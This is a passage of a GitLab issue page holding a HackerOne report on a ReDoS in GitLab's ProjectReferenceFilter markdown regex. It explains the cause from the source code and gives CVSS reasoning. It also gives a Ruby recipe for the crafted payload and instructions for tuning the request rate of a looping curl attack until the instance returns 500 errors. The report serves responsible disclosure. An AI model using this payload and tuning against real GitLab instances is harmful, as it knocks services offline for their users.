vulnerability._\n\n######  Details about the command constructed in step 9:  \nThe executed command send 1 request per second, and each 1 request that triggers ReDoS exhaust the resources of 1 CPU core.  \nThe GitLab instance has the default timeout of 60 seconds per request. However, because the load per request is too high, there are many worker processes that do not finish processing even after the timeout has passed.\n\n\n####  Additional informations to confirm this vulnerability meets the `A:H` criteria\n\n**_IMPORTANT NOTE: This section contains additional information to confirm that this vulnerability meets the criteria for `A:H`. Please use this information after triage, as this section contains time-consuming steps and may be an over-verification of whether this report is valid._**\n\nIf the GitLab instance is attacked at a well-tuned RPS(requests per second) rate for a reasonable amount of time, then as long as the attack continues, the instance will take 60+ seconds to process every single request.  \nThis indicates that timeouts are not working well under heavy load.  \nAs a result, `500 error` will be returned for each and every request.\n\n![500_error.png](https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png)\n\nI describe below how to attack at a well-tuned RPS rate for a reasonable amount of time **by using the command constructed in step 9 of \&quot;Steps to reproduce\&quot; section** of this report.\n\n1. Before running the constructed command, maintain separate session as an authenticated user by signing into the instance with a different browser than the one that obtained the unauthenticated user&#39;s CSRF token and session.\n\n2. Iterate on executing the constructed command and adjusting the RPS rate.  \n   The constructed command will display the PIDs of the spawned `curl` processes and the responses from the instance in the console.  \n   Please adjust the RPS rate as described below so that 1 or 2 PIDs and several `500 error` responses are alternately displayed.  \n   * We can adjust the RPS rate by changing the `sleep` value at the end of the command. For example, changing to `sleep 1;` will result in `RPS = 1`, `sleep 0.5;` will result in `RPS = 2`, and `sleep 2;` will result in `RPS = 0.5`.  \n   * We need to adjust the RPS rate so that [it does not exceed the \&quot;Test RPS rates\&quot; (discribed in \&quot;Clarifying notes\&quot;)](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes). As an example, for the [1k Reference Architecture](https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html), \&quot;Test RPS rates\&quot; is 2 RPS.\n\n   _NOTE: Since the default timeout is 60 seconds, we need to wait a few minutes after executing the command to see the PID and error response alternately displayed. There is no problem if the PIDs is displayed continuously occasionally, but if it is clearly not working, please stop the command and adjust the RPS rate._\n\n3. **With the tuned command still running**, visit any page on the instance with the authenticated user&#39;s session maintained in step 1 of this section.  \n   And check if the `500 error` is returned after a response delay of 60+ seconds.  \n   After you start getting `500 errors` for authenticated requests, wait tens of minutes and you&#39;ll start getting `500 errors` for unauthenticated requests and requests to the API.\n\n   _NOTE: This behavior seems to occur because handling authenticated requests tends to be more complex than handling unauthenticated requests._\n\n\nWhen I tested it on my instance, it took about 10-20 minutes at a rate of 1 RPS for my instance (16 CPU cores and 32GB of memory) to reach the above DoS state.  \nAdditionally, in a pipeline that started overlapping the above DoS state, the jobs failed with timeout because the runner was unable to communicate with the instance, and subsequent job on the pipeline was not run.\n\n![failed_pipeline.png](https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png)  \n![failed_jobs_timeout.png](https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png)\n\nAlso, when I looked at the runner logs in this state, I could see that the runner was failing to pick up the jobs.  \n```  \n$ sudo docker logs my_runner_container  \n[...snip...]  \nWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \nWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \nWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \nWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \n```  \n(Since I was using the [`gitlab/gitlab-runner:alpine` image](https://docs.gitlab.com/runner/install/docker.html#docker-images) for testing, I ran `docker logs` command to see the runner logs.)\n\nThese mean that the instance has been completely taken down, so this vulnerability fully meets [`A:H` criteria](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes).\n\n\n####  What is the current bug behavior?\n\nAlthough the behavior of this ReDoS bug isn&#39;t overly complicated, it&#39;s a bit tedious to get to the root cause from the observed DoS state.  \nSo I would like to explain this bug step by step by looking at the stack trace and source code.\n\nLooking at the stack trace at timeout, at first glance `ProjectReferenceFilter` does not seem to be the cause of this bug.  \n```  \nlib/banzai/filter/references/reference_filter.rb:209:in `replace_text_when_pattern_matches&#39;  \nlib/banzai/filter/references/reference_filter.rb:50:in `block in call&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `each&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `each_with_index&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `call&#39;  \n(...snip...)  \n```\n\nLet&#39;s look at the line 209 in `reference_filter.rb` where the timeout occurred.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L208-209  \n```ruby  \n        def replace_text_when_pattern_matches(node, index, pattern)  \n          return unless node.text =~ pattern  \n```\n\nThere is no doubt that a ReDoS has occurred because of `node.text =~ pattern`.  \nLet&#39;s take a look at the code on line 50 that calls `ReferenceFilter::replace_text_when_pattern_matches` method.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L45-50  \n```ruby  \n        def call  \n          ref_pattern_start = /\\A#{object_reference_pattern}\\z/\n\n          nodes.each_with_index do |node, index|  \n            if text_node?(node)  \n              replace_text_when_pattern_matches(node, index, object_reference_pattern) do |content|  \n```\n\nThis `call` method gets the regex pattern by calling `self.object_reference_pattern`.  \nWhen I added the debug code below and tested it, I found that `self.class` just before the timeout was `ProjectReferenceFilter`.\n\n```diff  \n        def call  \n          ref_pattern_start = /\\A#{object_reference_pattern}\\z/  \n+\n+         puts self.class.inspect       #=\u003e Banzai::Filter::References::ProjectReferenceFilter\n\n          nodes.each_with_index do |node, index|  \n            if text_node?(node)  \n              replace_text_when_pattern_matches(node, index, object_reference_pattern) do |content|  \n```\n\nLet&#39;s look at the definitions of `ProjectReferenceFilter.object_reference_pattern`.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/project_reference_filter.rb#L30-32  \n```ruby  \n        def object_reference_pattern  \n          [@]object_reference_pattern ||= Project.markdown_reference_pattern  \n        end  \n```\n\nIt looks like we will reach the goal soon.  \nLet&#39;s look at the definitions of `Project.markdown_reference_pattern`.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L915-921  \n```ruby  \n    def markdown_reference_pattern  \n      [@]markdown_reference_pattern ||=  \n        %r{  \n          #{reference_pattern}  \n          (#{reference_postfix}|#{reference_postfix_escaped})  \n        }x  \n    end  \n```\n\nLet&#39;s also look at the definitions of `reference_pattern`, `reference_postfix` and `reference_postfix_escaped`.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/app/models/project.rb#L896-910  \n```ruby  \n    def reference_pattern  \n      %r{  \n        (?\u003c!#{Gitlab::PathRegex::PATH_START_CHAR})  \n        ((?\u003cnamespace\u003e#{Gitlab::PathRegex::FULL_NAMESPACE_FORMAT_REGEX})/)?  \n        (?\u003cproject\u003e#{Gitlab::PathRegex::PROJECT_PATH_FORMAT_REGEX})  \n      }xo  \n    end\n\n    def reference_postfix  \n      &#39;\u003e&#39;  \n    end\n\n    def reference_postfix_escaped  \n      &#39;\u0026gt;&#39;  \n    end  \n```\n\n`Project.markdown_reference_pattern` method builds the final regex pattern by combining `reference_pattern`, `reference_postfix` and `reference_postfix_escaped`.  \nSo, the regex pattern that is finally constructed by `Project.markdown_reference_pattern` method is as follows:  \n```ruby  \n/\n          (?x-mi:  \n        (?\u003c![a-zA-Z0-9_\\.])  \n        ((?\u003cnamespace\u003e(?-mix:((?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*[a-zA-Z0-9_\\-]|[a-zA-Z0-9_])(?-mix:(?\u003c!\\.git|\\.atom)))\\/){,20}(?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*[a-zA-Z0-9_\\-]|[a-zA-Z0-9_])(?-mix:(?\u003c!\\.git|\\.atom)))))\\/)?  \n        (?\u003cproject\u003e(?-mix:(?:[a-zA-Z0-9_\\.][a-zA-Z0-9_\\-\\.]*)(?-mix:(?\u003c!\\.git|\\.atom))))  \n      )  \n          (\u003e|\u0026gt;)  \n        /x  \n```\n\nMatching this regex pattern with the payload contained in `ProjectReferenceFilter_ReDoS_payload.json` causes severe backtracking.  \nThe `(\u003e|\u0026gt;)` at the end of this pattern is typical of the backtracking triggers.  \nThe regex engine keeps wandering around looking for character `\u003e` or string `\u0026gt;` that doesn&#39;t exist in `ProjectReferenceFilter_ReDoS_payload.json`.\n\n_NOTE: The crafted payload in `ProjectReferenceFilter_ReDoS_payload.json` can be easily generated with the Ruby code `\&quot;mailto:\&quot; + \&quot;a-\&quot; * 499_000 + \&quot;[@]aaaaaaaa..aaaaaaaa.example.com\&quot;`._\n\n####  What is the expected correct behavior?\n\nA typical technique for fixing the ReDoS is to rewrite the code without using regex matching.  \nHowever, in this case, rewriting the code to not use regex matching could break consistency with other features.  \nSo, if we also care about consistency with other features, we need to rewrite the regex pattern `(\u003e|\u0026gt;)` nicely to prevent backtracking.\n\n####  Relevant logs and/or screenshots  \nI put references to the screenshots at the appropriate places in this report.  \nI also attach the stack trace when one request was forcefully stopped after 60+ seconds.  \n```  \nRack::Timeout::RequestTimeoutException (Request ran for longer than 60000ms ):  \n    \nlib/banzai/filter/references/reference_filter.rb:209:in `replace_text_when_pattern_matches&#39;  \nlib/banzai/filter/references/reference_filter.rb:50:in `block in call&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `each&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `each_with_index&#39;  \nlib/banzai/filter/references/reference_filter.rb:48:in `call&#39;  \nlib/banzai/filter/references/reference_filter.rb:42:in `block in call_and_update_nodes&#39;  \nlib/banzai/filter/references/reference_filter.rb:291:in `with_update_nodes&#39;  \nlib/banzai/filter/references/reference_filter.rb:42:in `call_and_update_nodes&#39;  \nlib/banzai/filter/references/reference_filter.rb:30:in `call&#39;  \nlib/banzai/pipeline/base_pipeline.rb:23:in `block (2 levels) in singleton class&#39;  \nlib/banzai/renderer.rb:130:in `render_result&#39;  \nlib/banzai/renderer.rb:166:in `cacheless_render&#39;  \nlib/banzai/renderer.rb:30:in `render&#39;  \nlib/banzai/renderer.rb:120:in `block in cache_collection_render&#39;  \nlib/banzai/renderer.rb:119:in `each&#39;  \nlib/banzai/renderer.rb:119:in `cache_collection_render&#39;  \nlib/banzai/reference_extractor.rb:33:in `html_documents&#39;  \nlib/banzai/reference_extractor.rb:18:in `references&#39;  \nlib/gitlab/reference_extractor.rb:24:in `references&#39;  \nlib/gitlab/reference_extractor.rb:43:in `block (2 levels) in \u003cclass:ReferenceExtractor\u003e&#39;  \napp/services/preview_markdown_service.rb:33:in `find_user_references&#39;  \napp/services/preview_markdown_service.rb:6:in `execute&#39;  \napp/controllers/concerns/preview_markdown.rb:8:in `preview_markdown&#39;  \nee/lib/gitlab/ip_address_state.rb:10:in `with&#39;  \nee/app/controllers/ee/application_controller.rb:45:in `set_current_ip_address&#39;  \napp/controllers/application_controller.rb:524:in `set_current_admin&#39;  \nlib/gitlab/session.rb:11:in `with_session&#39;  \napp/controllers/application_controller.rb:515:in `set_session_storage&#39;  \nlib/gitlab/i18n.rb:107:in `with_locale&#39;  \napp/controllers/application_controller.rb:508:in `set_locale&#39;  \napp/controllers/application_controller.rb:499:in `set_current_context&#39;  \nlib/gitlab/metrics/elasticsearch_rack_middleware.rb:16:in `call&#39;  \nlib/gitlab/middleware/memory_report.rb:13:in `call&#39;  \nlib/gitlab/middleware/speedscope.rb:13:in `call&#39;  \nlib/gitlab/database/load_balancing/rack_middleware.rb:23:in `call&#39;  \nlib/gitlab/middleware/rails_queue_duration.rb:33:in `call&#39;  \nlib/gitlab/metrics/rack_middleware.rb:16:in `block in call&#39;  \nlib/gitlab/metrics/web_transaction.rb:46:in `run&#39;  \nlib/gitlab/metrics/rack_middleware.rb:16:in `call&#39;  \nlib/gitlab/jira/middleware.rb:19:in `call&#39;  \nlib/gitlab/middleware/go.rb:20:in `call&#39;  \nlib/gitlab/etag_caching/middleware.rb:21:in `call&#39;  \nlib/gitlab/middleware/query_analyzer.rb:11:in `block in call&#39;  \nlib/gitlab/database/query_analyzer.rb:37:in `within&#39;  \nlib/gitlab/middleware/query_analyzer.rb:11:in `call&#39;  \nlib/gitlab/middleware/multipart.rb:173:in `call&#39;  \nlib/gitlab/middleware/read_only/controller.rb:50:in `call&#39;  \nlib/gitlab/middleware/read_only.rb:18:in `call&#39;  \nlib/gitlab/middleware/same_site_cookies.rb:27:in `call&#39;  \nlib/gitlab/middleware/basic_health_check.rb:25:in `call&#39;  \nlib/gitlab/middleware/handle_malformed_strings.rb:21:in `call&#39;  \nlib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call&#39;  \nlib/gitlab/middleware/request_context.rb:21:in `call&#39;  \nlib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call&#39;  \nconfig/initializers/fix_local_cache_middleware.rb:11:in `call&#39;  \nlib/gitlab/middleware/compressed_json.rb:37:in `call&#39;  \nlib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call&#39;  \nlib/gitlab/middleware/sidekiq_web_static.rb:20:in `call&#39;  \nlib/gitlab/metrics/requests_rack_middleware.rb:79:in `call&#39;  \nlib/gitlab/middleware/release_env.rb:13:in `call&#39;  \n```\n\n####  Output of checks  \nThis bug happens on the official Docker installation of GitLab Enterprise Edition `15.11.0-ee`.  \nI used `Chromium 112` and `Firefox 112` on Debian 11 to verify this bug.\n\n######  Results of GitLab environment info  \nOutput of `sudo gitlab-rake gitlab:env:info`:  \n```  \nSystem information  \nSystem:\t\t  \nProxy:\t\tno  \nCurrent User:\tgit  \nUsing RVM:\tno  \nRuby Version:\t3.0.6p216  \nGem Version:\t3.2.33  \nBundler Version:2.3.15  \nRake Version:\t13.0.6  \nRedis Version:\t6.2.11  \nSidekiq Version:6.5.7  \nGo Version:\tunknown\n\nGitLab information  \nVersion:\t15.11.0-ee  \nRevision:\t4dce6bc3728  \nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:\tPostgreSQL  \nDB Version:\t13.8  \nURL:\t\thttp://my-gitlab-h1.test  \nHTTP Clone URL:\thttp://my-gitlab-h1.test/some-group/some-project.git  \nSSH Clone URL:\tgit@my-gitlab-h1.test:some-group/some-project.git  \nElasticsearch:\tno  \nGeo:\t\tno  \nUsing LDAP:\tno  \nUsing Omniauth:\tyes  \nOmniauth Providers: \n\nGitLab Shell  \nVersion:\t14.18.0  \nRepository storages:  \n- default: \tunix:/var/opt/gitlab/gitaly/gitaly.socket  \nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \n```\n\n####  Impact\n\nBy exploiting this ReDoS vulnerability, an unauthenticated attacker could significantly reduce the availability of the entire the GitLab instance.  \nBased on [the policy of GitLab&#39;s Bug Bounty Program](https://hackerone.com/gitlab?view_policy=true), past reports, and my research on the impact of this bug, I would suggest the following CVSS score:  \n```  \nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \n7.5 (High)  \n```  \nI would also like to add some detailed explanations of the notable points in the above score.\n\n* `PR:N` : As described in the \&quot;Steps to reproduce\&quot; section, this attack can be performed by an unauthenticated attacker.\n\n* `A:H` : This ReDoS attack causes enough load to meet the `A:H` criteria for the [1k Reference Architecture](https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html) as stated in [GitLab CVSS Calculator page](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/).  \nMore specifically, this attack clearly satisfies the \&quot;Clarifying notes\&quot; condition in [GitLab CVSS Calculator page](https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/).  \n\u003e When evaluating Availability impacts for DoS that require sustained traffic, use the [1k Reference Architecture](https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html). The number of requests must be fewer than the \&quot;test request per seconds rates\&quot; and cause 10+ seconds of user-perceivable unavailability to rate the impact as `A:H`.\n\nIn addition to the above, it is important to note that any feature with Markdown fields is vulnerable to this ReDoS attack.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [ProjectReferenceFilter_ReDoS_payload.json](https://h1.sec.gitlab.net/a/1892d7aa-a873-45b2-ab68-9926e8fa5cb2/ProjectReferenceFilter_ReDoS_payload.json)\n* [create_public_group_updated.png](https://h1.sec.gitlab.net/a/4c693521-3a6e-41ba-b135-ef39e65ec5a9/create_public_group_updated.png)\n* [csrf_token.png](https://h1.sec.gitlab.net/a/7778001e-852a-4a7d-a001-2baa73c1c8ae/csrf_token.png)\n* [session_value.png](https://h1.sec.gitlab.net/a/278850fd-8f02-4d19-ad67-e6103e6c387f/session_value.png)\n* [htop_all_cores_exhausted.png](https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png)\n* [response_delay.png](https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png)\n* [500_error.png](https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png)\n* [failed_pipeline.png](https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png)\n* [failed_jobs_timeout.png](https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;title&quot;:&quot;ReDoS via ProjectReferenceFilter in any Markdown fields&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:2969682,&quot;updated_by_id&quot;:10425157,&quot;created_at&quot;:&quot;2023-06-26T04:15:17Z&quot;,&quot;updated_at&quot;:&quot;2024-03-13T16:44:35Z&quot;,&quot;milestone&quot;:{&quot;id&quot;:2969682,&quot;iid&quot;:90,&quot;group_id&quot;:9970,&quot;title&quot;:&quot;16.3&quot;,&quot;description&quot;:&quot;&quot;,&quot;state&quot;:&quot;closed&quot;,&quot;created_at&quot;:&quot;2023-02-01T16:03:42.396Z&quot;,&quot;updated_at&quot;:&quot;2024-02-12T11:13:44.876Z&quot;,&quot;due_date&quot;:&quot;2023-08-17&quot;,&quot;start_date&quot;:&quot;2023-07-18&quot;,&quot;expired&quot;:true,&quot;web_url&quot;:&quot;https://gitlab.com/groups/gitlab-org/-/milestones/90&quot;},&quot;labels&quot;:[{&quot;id&quot;:22241940,&quot;title&quot;:&quot;Category:Team Planning&quot;,&quot;color&quot;:&quot;#6699cc&quot;,&quot;description&quot;:&quot;Plan, organize, and track team progress using Scrum, Kanban, SAFe, and other Agile methodologies.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-10-22T13:33:21.426Z&quot;,&quot;updated_at&quot;:&quot;2021-10-22T13:33:21.426Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:17006635,&quot;title&quot;:&quot;Weakness::CWE-400&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Denial of Service&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-11-09T22:14:41.441Z&quot;,&quot;updated_at&quot;:&quot;2020-11-09T22:14:41.441Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103451,&quot;title&quot;:&quot;devops::plan&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Plan stage of the DevOps lifecycle (e.g. Project Management, Agile Portfolio Management, Requirements Management)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:00:23.723Z&quot;,&quot;updated_at&quot;:&quot;2022-05-11T06:40:37.661Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:10690691,&quot;title&quot;:&quot;group::project management&quot;,&quot;color&quot;:&quot;#A8D695&quot;,&quot;description&quot;:&quot;Issues belonging to the Project Management group of the Plan stage of the DevOps lifecycle. See https://about.gitlab.com/handbook/product/categories/#team-planning-group | PM: @gweaver&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2019-05-22T19:55:45.218Z&quot;,&quot;updated_at&quot;:&quot;2020-08-28T15:40:02.313Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857523,&quot;title&quot;:&quot;priority::2&quot;,&quot;color&quot;:&quot;#ff8800&quot;,&quot;description&quot;:&quot;We will address this soon and will provide capacity from our team for it in the next few releases. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:01:55.497Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:23:35.254Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713902,&quot;title&quot;:&quot;severity::2&quot;,&quot;color&quot;:&quot;#ff8800&quot;,&quot;description&quot;:&quot;Critical - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:34.880Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:15.351Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2526320,&quot;title&quot;:&quot;workflow::in dev&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues that are actively being worked on by a developer&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-08-22T19:48:54.168Z&quot;,&quot;updated_at&quot;:&quot;2020-10-06T14:56:32.883Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}],&quot;lock_version&quot;:0,&quot;author_id&quot;:2741139,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[{&quot;id&quot;:194645,&quot;username&quot;:&quot;digitalmoksha&quot;,&quot;name&quot;:&quot;Brett Walker&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://gitlab.com/uploads/-/system/user/avatar/194645/avatar.png&quot;,&quot;web_url&quot;:&quot;https://gitlab.com/digitalmoksha&quot;}],&quot;due_date&quot;:&quot;2023-07-22&quot;,&quot;project_id&quot;:278964,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/gitlab-org/gitlab/-/issues/416225&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/gitlab-org/gitlab/notes?target_id=129825140\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=416225\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:false,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;,&quot;weight&quot;:null,&quot;blocked&quot;:false,&quot;blocked_by_issues&quot;:[]}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:129825140,&quot;projectId&quot;:278964,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/gitlab-org/gitlab/-/issues/416225/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/gitlab-org/gitlab/-/issues/416225.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/gitlab-org/gitlab/-/issues/416225.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/gitlab-org/gitlab/noteable/issue/129825140/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736532953000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-border-0" type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/gitlab-org/gitlab/-/issues/416225.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="200">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
